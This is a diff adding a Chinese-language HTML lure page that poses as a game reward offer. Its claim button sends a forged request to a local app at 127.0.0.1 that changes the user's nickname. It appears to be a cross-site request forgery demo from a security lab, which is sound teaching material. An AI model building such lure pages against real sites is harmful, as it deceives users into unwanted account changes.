@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>存档扩容奖励 · 福利中心</title>
+<link rel="stylesheet" href="/attack/product.css">
+</head>
+<body>
+<header class="p-head">
+  <span class="brand">共生之缚 · 福利中心</span>
+  <span class="who">限时活动</span>
+</header>
+
+<main class="p-main">
+  <h1>存档扩容奖励</h1>
+  <div class="p-card">
+    <p>活动期间，所有设备可免费扩容一个存档槽位。点击下方按钮即可领取，无需重新登录。</p>
+    <p class="muted">活动截止：本月底</p>
+    <button class="p-btn" id="go">立即领取</button>
+    <p class="p-result" id="status">尚未领取</p>
+  </div>
+  <pre class="p-pre" id="url"></pre>
+</main>
+
+<script>
+  var name = encodeURIComponent('这个昵称被改了');
+  var target = 'http://127.0.0.1:18090/nickname?name=' + name;
+  document.getElementById('url').textContent = '跳转地址：' + target;
+
+  document.getElementById('go').addEventListener('click', function () {
+    document.getElementById('status').textContent = '跳转中';
+    location.href = target;
+  });
+</script>
+</body>
+</html>
